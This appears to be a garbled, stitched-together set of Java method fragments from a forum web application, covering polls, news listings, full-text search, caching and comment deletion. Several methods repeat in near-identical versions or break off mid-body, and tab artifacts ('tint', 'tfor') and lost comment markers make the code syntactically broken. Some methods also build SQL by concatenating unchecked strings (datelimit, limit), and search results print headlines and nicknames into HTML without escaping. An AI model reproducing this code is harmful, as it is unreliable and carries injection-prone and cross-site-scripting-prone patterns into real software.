public int getPreviousMessage ( Connection db , int scrollMode ) throws SQLException { PreparedStatement pst ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT max(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return 0 ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public String printMessage ( Template tmpl , Connection db , boolean showMenu , String user ) throws SQLException , IOException , UserNotFoundException , UtilException { return printMessage ( tmpl , db , showMenu , user , 0 ) ; } 
public String renderPoll ( Connection db , Template tmpl ) throws SQLException , BadImageException , IOException { return renderPoll ( db , tmpl , 0 ) ; } 
public String renderPoll ( Connection db , Template tmpl , int highlight ) throws SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + tmpl . getStyle ( ) + " /img/votes.gif " ) ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { tPollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; tint id = var . getId ( ) ; tint votes = var . getVotes ( ) ; if ( id = = highlight ) { out . append ( " <b> " ) ; } out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; if ( id = = highlight ) { out . append ( " </b> " ) ; } out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; tfor ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" " ) . append ( tmpl . getStyle ( ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " </table> " ) ; return out . toString ( ) ; } 
public String renderPoll ( Connection db , Template tmpl , int highlight ) throws SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; int total = 0 ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + tmpl . getStyle ( ) + " /img/votes.gif " ) ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { tPollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; tint id = var . getId ( ) ; tint votes = var . getVotes ( ) ; if ( id = = highlight ) { out . append ( " <b> " ) ; } out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; if ( id = = highlight ) { out . append ( " </b> " ) ; } out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; total + = votes ; tfor ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" " ) . append ( tmpl . getStyle ( ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( total ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . toString ( ) ; } 
public String renderPoll ( Connection db , Template tmpl , int highlight ) throws SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; int total = 0 ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + tmpl . getStyle ( ) + " /img/votes.gif " ) ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { tPollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; tint id = var . getId ( ) ; tint votes = var . getVotes ( ) ; if ( id = = highlight ) { out . append ( " <b> " ) ; } out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; if ( id = = highlight ) { out . append ( " </b> " ) ; } out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; total + = votes ; tfor ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" / " ) . append ( tmpl . getStyle ( ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( total ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . toString ( ) ; } 
public static int getPollIdByTopic ( Connection db , int msgid ) throws SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT votenames.id FROM votenames,topics WHERE topics.id=? AND votenames.topic=topics.id " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , msgid ) ; ResultSet rs = pst . executeQuery ( ) ; return rs . next ( ) ? rs . getInt ( " id " ) : 0 ; } 
public String renderPoll ( Connection db , Template tmpl , int highlight ) throws SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + tmpl . getStyle ( ) + " /img/votes.gif " ) ; int total = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { tPollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; tint id = var . getId ( ) ; tint votes = var . getVotes ( ) ; if ( id = = highlight ) { out . append ( " <b> " ) ; } out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; if ( id = = highlight ) { out . append ( " </b> " ) ; } out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; total + = votes ; tfor ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" / " ) . append ( tmpl . getStyle ( ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( total ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . toString ( ) ; } 
public String renderPoll ( Connection db ) throws SQLException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; int total = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { tPollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; tint votes = var . getVotes ( ) ; out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; ttotal + = votes ; tfor ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" / " ) . append ( " /white/img/votes.gif \" alt= \" * \" > " ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( total ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . toString ( ) ; } 
public String renderPoll ( Connection db , String fullUrl ) throws SQLException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; int total = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { tPollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; tint votes = var . getVotes ( ) ; out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; ttotal + = votes ; tfor ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" / " ) . append ( fullUrl + " white/img/votes.gif \" alt= \" * \" > " ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( total ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . toString ( ) ; } 
public String renderPoll ( Connection db , String fullUrl ) throws SQLException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; int total = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { tPollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; tint votes = var . getVotes ( ) ; out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; ttotal + = votes ; tfor ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" " ) . append ( fullUrl + " white/img/votes.gif \" alt= \" * \" > " ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( total ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . toString ( ) ; } 
private static synchronized void initProperties ( ServletContext sc ) throws IOException { if ( properties = = null ) { InputStream is = null ; 
public String showAll ( Connection db , Template tmpl ) throws IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " topics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, sections.id as section " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . toString ( ) + " " + " ORDER BY commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , tmpl , res ) ) ; } res . close ( ) ; return buf . toString ( ) ; } 
public String show ( Connection db ) throws IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " topics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, sections.id as section " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . toString ( ) + " " + " ORDER BY commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . toString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { StringBuilder id = new StringBuilder ( " view-news? " + " SearchMode= " + prof . getBoolean ( " SearchMode " ) + " &topics= " + prof . getInt ( " topics " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ) ; if ( viewAll ) { id . append ( " &view-all=true " ) ; } if ( section ! = 0 ) { id . append ( " &section= " ) . append ( section ) ; } if ( group ! = 0 ) { id . append ( " &group= " ) . append ( group ) ; } if ( datelimit ! = null ) { id . append ( " &datelimit= " ) . append ( URLEncoder . encode ( datelimit ) ) ; } if ( limit ! = null & & limit . length ( ) > 0 ) { id . append ( " &limit= " ) . append ( URLEncoder . encode ( limit ) ) ; } return id . toString ( ) ; } 
public String renderPoll ( Connection db , Properties config , ProfileHashtable profile ) throws SQLException , BadImageException , IOException { return renderPoll ( db , config , profile , 0 ) ; } 
public String renderPoll ( Connection db , Properties config , ProfileHashtable profile , int highlight ) throws SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( config . getProperty ( " HTMLPathPrefix " ) + profile . getString ( " style " ) + " /img/votes.gif " ) ; int total = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { tPollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; tint id = var . getId ( ) ; tint votes = var . getVotes ( ) ; if ( id = = highlight ) { out . append ( " <b> " ) ; } out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; if ( id = = highlight ) { out . append ( " </b> " ) ; } out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; total + = votes ; tfor ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" / " ) . append ( profile . getString ( " style " ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( total ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . toString ( ) ; } 
public String renderPoll ( Connection db , String fullUrl ) throws SQLException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; int total = 0 ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { tPollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; tint votes = var . getVotes ( ) ; out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; ttotal + = votes ; tfor ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" " ) . append ( fullUrl ) . append ( " white/img/votes.gif \" alt= \" * \" > " ) ; } out . append ( " </td></tr> " ) ; } out . append ( " <tr><td colspan=2> : " ) . append ( total ) . append ( " </td></tr> " ) ; out . append ( " </table> " ) ; return out . toString ( ) ; } 
String show ( Connection db ) throws IOException , SQLException , UtilException ; String getVariantID ( ProfileHashtable prof ) throws UtilException ; java . util . Date getExpire ( ) ; } 
String getVariantID ( ProfileHashtable prof ) throws UtilException ; java . util . Date getExpire ( ) ; } 
public static String getViewer ( Viewer viewer , Template tmpl , boolean nocache , boolean closeConnection ) throws UtilException , SQLException , IOException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( tmpl , viewer . getVariantID ( tmpl . getProf ( ) ) ) ; String res = null ; if ( ! nocache ) { res = ( String ) mcc . get ( cacheId ) ; } if ( res = = null ) { try { Connection db = tmpl . getConnection ( " viewer-cacher " ) ; res = viewer . show ( db ) ; } finally { if ( closeConnection ) { tmpl . getObjectConfig ( ) . SQLclose ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public String show ( Connection db ) throws IOException , SQLException , UtilException { StringBuilder select = new StringBuilder ( " SELECT msgs.id, title, postdate, section, topic, rank(idxFTI, q) as rank, headline(message, q, 'HighlightAll=True') as headline " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " + section ) ; } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = db . prepareStatement ( select . toString ( ) ) ; pst . setString ( 1 , query ) ; ResultSet rs = pst . executeQuery ( ) ; return printResults ( rs ) ; } 
private String printResults ( ResultSet rs ) throws SQLException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" " ) ; while ( rs . next ( ) ) { String title = rs . getString ( " title " ) ; int topic = rs . getInt ( " topic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; String url ; if ( topic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + topic + " # " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " + url + " \" > " + HTMLFormatter . htmlSpecialChars ( title ) + " </a></h2> " ) ; out . append ( " <p> " + headline + " </p> " ) ; out . append ( " <i> " + Template . dateFormat . format ( postdate ) + " </i> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . toString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { return " search?q= " + URLEncoder . encode ( query ) + " &include= " + include + " &date= " + date + " &section= " + section + " &sort= " + sort ; } 
public static int parseInclude ( String include ) { if ( include = = null ) { return SEARCH_ALL ; } if ( include . equals ( " topics " ) ) { return SEARCH_TOPICS ; } return SEARCH_ALL ; } 
public static int parseDate ( String date ) { if ( date = = null ) { return SEARCH_YEAR ; } if ( date . equals ( " 3month " ) ) { return SEARCH_3MONTH ; } if ( date . equals ( " all " ) ) { return SEARCH_ALL ; } return SEARCH_YEAR ; } 
public static String getViewer ( Viewer viewer , Template tmpl , boolean nocache , boolean closeConnection ) throws UtilException , SQLException , IOException { return new ViewerCacher ( ) . get ( viewer , tmpl , nocache , closeConnection ) ; } 
public String get ( Viewer viewer , Template tmpl , boolean nocache , boolean closeConnection ) throws UtilException , SQLException , IOException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( tmpl , viewer . getVariantID ( tmpl . getProf ( ) ) ) ; String res = null ; if ( ! nocache ) { time = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . get ( cacheId ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = true ; } if ( res = = null ) { try { long current = new Date ( ) . getTime ( ) ; Connection db = tmpl . getConnection ( " viewer-cacher " ) ; res = viewer . show ( db ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( closeConnection ) { tmpl . getObjectConfig ( ) . SQLclose ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public boolean isFromCache ( ) { return fromCache ; } 
public String show ( Connection db ) throws IOException , SQLException , UtilException { StringBuilder select = new StringBuilder ( " SELECT msgs.id, title, postdate, section, topic, nick, score, max_score, rank(idxFTI, q) as rank, headline(message, q, 'HighlightAll=True') as headline " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " + section ) ; } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = db . prepareStatement ( select . toString ( ) ) ; pst . setString ( 1 , query ) ; ResultSet rs = pst . executeQuery ( ) ; return printResults ( rs ) ; } 
private String printResults ( ResultSet rs ) throws SQLException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" " ) ; while ( rs . next ( ) ) { String title = rs . getString ( " title " ) ; int topic = rs . getInt ( " topic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; String nick = rs . getString ( " nick " ) ; int userScore = rs . getInt ( " score " ) ; int userMaxScore = rs . getInt ( " max_score " ) ; String url ; if ( topic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + topic + " # " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " + url + " \" > " + HTMLFormatter . htmlSpecialChars ( title ) + " </a></h2> " ) ; out . append ( " <p> " + headline + " </p> " ) ; out . append ( " <p><i> " ) . append ( nick ) . append ( ' ' ) ; if ( ! " anonymous " . equals ( nick ) ) { out . append ( User . getStars ( userScore , userMaxScore ) ) . append ( ' ' ) ; } out . append ( " (<a href= \" whois.jsp?nick= " ) . append ( URLEncoder . encode ( nick ) ) . append ( " \" >*</a>) ( " ) . append ( Template . dateFormat . format ( postdate ) ) . append ( " )</i> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . toString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { StringBuilder id = new StringBuilder ( " view-news? " + " topics= " + prof . getInt ( " topics " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ) ; if ( viewAll ) { id . append ( " &view-all=true " ) ; } if ( section ! = 0 ) { id . append ( " &section= " ) . append ( section ) ; } if ( group ! = 0 ) { id . append ( " &group= " ) . append ( group ) ; } if ( datelimit ! = null ) { id . append ( " &datelimit= " ) . append ( URLEncoder . encode ( datelimit ) ) ; } if ( limit ! = null & & limit . length ( ) > 0 ) { id . append ( " &limit= " ) . append ( URLEncoder . encode ( limit ) ) ; } return id . toString ( ) ; } 
public String DocumentFooter ( boolean closeHtml ) throws IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } out . append ( " <p><div align=center> " ) ; if ( isMainPage ( ) ) { out . append ( config . getStorage ( ) . readMessage ( " buttons " , " top100-main-button " ) ) ; out . append ( config . getStorage ( ) . readMessage ( " buttons " , " toplist-main-button " ) ) ; out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\">" + "</script>" + "<script type=\"text/javascript\">" + "_uacct = \"UA-2184304-1\";" + "urchinTracker();" + "</script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { return " " ; } 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { return " messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ; } 
public static void main ( String [ ] args ) throws Exception { Hashtable defaults = getDefaultProfile ( ) ; FileOutputStream f = new FileOutputStream ( " anonymous " ) ; ObjectOutputStream o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _debug " ) ; defaults . put ( " DebugMode " , Boolean . TRUE ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _white2 " ) ; defaults . put ( " style " , " white2 " ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _white " ) ; defaults . put ( " style " , " white " ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; } 
public Message getNextMessage ( Connection db ) throws SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( getSectionId ( ) ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT min(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public Message getPreviousMessage ( Connection db ) throws SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( getSectionId ( ) ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT max(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public void block ( Connection db ) throws SQLException { Statement st = null ; try { st = db . createStatement ( ) ; 
public String deleteAllComments ( Connection db , Logger logger , User moderator ) throws SQLException { Statement st = null ; ResultSet rs = null ; CommentDeleter deleter = null ; StringBuilder out = new StringBuilder ( ) ; try { deleter = new CommentDeleter ( db , logger ) ; st = db . createStatement ( ) ; rs = st . executeQuery ( " SELECT id FROM comments WHERE userid= " + id + " AND not deleted ORDER BY id DESC FOR update " ) ; while ( rs . next ( ) ) { int msgid = rs . getInt ( " id " ) ; out . append ( " # " ) . append ( msgid ) . append ( " <br> " ) ; out . append ( deleter . deleteReplys ( msgid , moderator , true ) ) ; out . append ( deleter . deleteComment ( msgid , " 4.7 Flood (auto) " , moderator , 20 ) ) ; out . append ( " <br> " ) ; } } finally { if ( deleter ! = null ) { deleter . close ( ) ; } if ( rs ! = null ) { rs . close ( ) ; } if ( st ! = null ) { st . close ( ) ; } } return out . toString ( ) ; } 
